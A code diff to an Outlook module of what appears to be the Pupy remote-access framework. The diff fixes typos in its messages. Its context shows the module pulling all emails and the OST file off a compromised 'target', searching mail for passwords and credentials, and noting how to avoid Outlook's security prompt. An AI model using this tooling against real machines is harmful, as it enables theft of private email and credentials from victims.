@@ -24,8 +24,8 @@ class Outlook(PupyModule):
 		self.arg_parser = PupyArgumentParser(prog="outlook", description=self.__doc__)
 		self.arg_parser.add_argument('-i', dest='information', action='store_true', help="Get Outlook configuration")
 		self.arg_parser.add_argument('-l', dest='foldersAndSubFolders', action='store_true', help="Get Outlook folders and subfolders")
-		self.arg_parser.add_argument('-n', dest='numberOfEmails', action='store_true', help="Get number of emails stored in the outlook folder choisen (see options below)")
-		self.arg_parser.add_argument('-d', dest='downloadAllEmails', action='store_true', help="Download all emails stored in the outlook folder choisen with MAPI (see options below)")
+		self.arg_parser.add_argument('-n', dest='numberOfEmails', action='store_true', help="Get number of emails stored in the Outlook folder chosen (see options below)")
+		self.arg_parser.add_argument('-d', dest='downloadAllEmails', action='store_true', help="Download all emails stored in the Outlook folder chosen with MAPI (see options below)")
 		self.arg_parser.add_argument('-t', dest='downloadOST', action='store_true', help="Download Outlook OST file (Offline or cached Outlook items)")
 		self.arg_parser.add_argument('-s', dest='search', action='store_true', help="Search strings in emails, see -strings for options")
 		self.arg_parser.add_argument('-strings', dest='strings', default="password,pwd,credentials", help="Strings to search in emails (use with -s) (default: %(default)s)")
@@ -54,13 +54,13 @@ class Outlook(PupyModule):
 				download(self.client.conn, paths[0][1], localPath)
 				self.success("OST file downloaded from {0} to {1}".format(paths[0][1], localPath))
 			else:
-				self.error("OST file not found or an error occured")
+				self.error("OST file not found or an error occurred")
 		if outlook.outlookIsInstalled() == True:
 			self.success("Outlook application seems to be installed on the target, trying to connect to MAPI...")
 			if outlook.connect() == True:
-				self.success("Connected to outlook application trough MAPI")
+				self.success("Connected to Outlook application through MAPI")
 			else:
-				self.error("Impossible to connect to outlook application trough MAPI. Abording!")
+				self.error("Impossible to connect to Outlook application through MAPI. Aborting!")
 				return
 		else:
 			self.error("Outlook application doesn't seem to be installed on the target. Nothing to do. Cancelling!")
@@ -84,12 +84,12 @@ class Outlook(PupyModule):
 			self.success("Trying to download all emails stored in the {0} folder".format(args.outlookFolder))
 			nb = outlook.getNbOfEmails()
 			if nb == 0:
-				self.error("This box is empty. You should choose another outlook folder")
+				self.error("This box is empty. You should choose another Outlook folder")
 			else:
 				self.success("{0} emails found in {0}, Starting download...".format(args.outlookFolder))
 				self.success("You can use msgconvert for reading these emails locally")
 				self.warning("If nothing happens, a Outlook security prompt has probably been triggered on the target.")
-				self.warning("Notice if an antivirus is installed on the target, you should be abled to download emails without security prompt (see https://support.office.com/en-us/article/I-get-warnings-about-a-program-accessing-e-mail-address-information-or-sending-e-mail-on-my-behalf-df007135-c632-4ae4-8577-dd4ba26750a2)")
+				self.warning("Notice if an antivirus is installed on the target, you should be able to download emails without a security prompt (see https://support.office.com/en-us/article/I-get-warnings-about-a-program-accessing-e-mail-address-information-or-sending-e-mail-on-my-behalf-df007135-c632-4ae4-8577-dd4ba26750a2)")
 				logging.debug("Downloading all emails")
 				for i, anEmail in enumerate(outlook.getEmails()):
 					aPathToMailFile, filename = outlook.getAMailFile(anEmail)
